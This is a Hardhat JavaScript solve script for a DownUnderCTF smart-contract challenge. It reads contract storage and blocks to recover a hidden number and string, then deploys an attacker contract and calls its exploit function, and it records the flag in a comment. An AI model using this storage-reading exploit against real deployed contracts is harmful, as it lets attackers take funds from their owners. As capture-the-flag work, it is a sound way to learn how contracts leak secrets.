const { ethers } = require('hardhat');

async function main() {
  const [/*deployer, */attackerAcc] = await ethers.getSigners();
  const secretandephemeral = await ethers.getContractAt("SecretAndEphemeral", "0x690A24edf6461A80c327131556E50077226b6770");
  // for(let i = 0; i < 128; ++i) {
  //   let prefix = "";
  //   if(i < 10) {
  //     prefix = "0";
  //   }
  //   console.log(prefix + i.toString() + " " + await ethers.provider.getStorageAt(secretandephemeral.address, i));
  // }
  // console.log(await ethers.provider.getCode(secretandephemeral.address)); // nope :()
  // console.log(await ethers.provider.getBlock(3)); // tx 0xaf7eb8318105cd04bd97ab1253b77d12d7cfbb90f7274f37f31e0a6c7209168e
  // console.log(await ethers.provider.getBlock(4)); // tx 0xd3383dd590ea361847180c3616faed3a091c3e8f3296771e0c2844b2746d408f
  // console.log(await ethers.provider.getBlock(5)); // tx 0xbd0905bd8bd97e995a457e93871148170eb00c01b5e9c973933ceeff71e0f7ba

  // const txes = [];
  // for(let blockNumber = 3; blockNumber <= 100; ++blockNumber) {
  //   console.log({blockNumber});
  //   const blockInfo = await ethers.provider.getBlock(blockNumber);
  //   if(blockInfo.transactions.length > 0) {
  //     console.log({blockNumber, txes: blockInfo.transactions});
  //     for(let i = 0; i < blockInfo.transactions.length; ++i) {
  //       txes.push(blockInfo.transactions[i]);
  //     }
  //   }
  // }
  // console.log(txes);
  // no more txes

  // console.log(await ethers.provider.getBlockWithTransactions(3)); // send money to player tx
  // console.log(await ethers.provider.getBlockWithTransactions(4));
  // console.log(await ethers.provider.getBlockWithTransactions(5)); // deposit tx

/*
0000000000000000000000000dec0ded
00000000000000000000000000000000
00000000000000000000000000000022
736f20616e79776179732069206a7573
74207374617274656420626c61737469
6e670000000000000000000000000000
00000000000000000000000000000000
*/
  const account = "0x7BCF8A237e5d8900445C148FC2b119670807575b";
  const secretNumber = 0xdec0ded;
  const secretString = "so anyways i just started blasting";

  const Attacker = await ethers.getContractFactory("SecretAndEphemeralAttacker", attackerAcc);
  console.log("Deploying Attacker...");
  const attacker = await Attacker.deploy(secretandephemeral.address, secretString, secretNumber, [account]);
  await attacker.deployed();
  console.log("Attacker deployed to:", attacker.address);
  await attacker.connect(attackerAcc).exploit();

  // DUCTF{u_r_a_web3_t1me_7raveler_:)}
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
